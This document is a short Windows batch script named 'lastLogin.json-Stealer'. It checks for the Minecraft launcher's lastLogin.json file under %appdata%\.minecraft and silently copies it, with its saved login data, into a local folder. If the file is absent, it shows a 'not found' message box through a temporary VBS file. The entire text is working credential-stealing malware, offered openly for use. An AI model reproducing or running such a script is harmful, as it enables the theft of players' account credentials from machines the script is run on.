@echo off
REM lastLogin.json-Stealer - by Frederik Shull!
title lastLogin.json-Stealer
setlocal enabledelayedexpansion
if not exist %appdata%\.minecraft\lastLogin.json (
echo MsgBox "lastLogin.json not found.",0,"File not found.">lastLogin.json-Stealer_temp.vbs
start lastLogin.json-Stealer_temp.vbs 2>nul
ping -n 01 localhost >nul
del lastLogin.json-Stealer_temp.vbs 2>nul
exit
)
xcopy %appdata%\.minecraft\lastLogin.json lastLogin.json-Stealer.data\>nul 2>nul
exit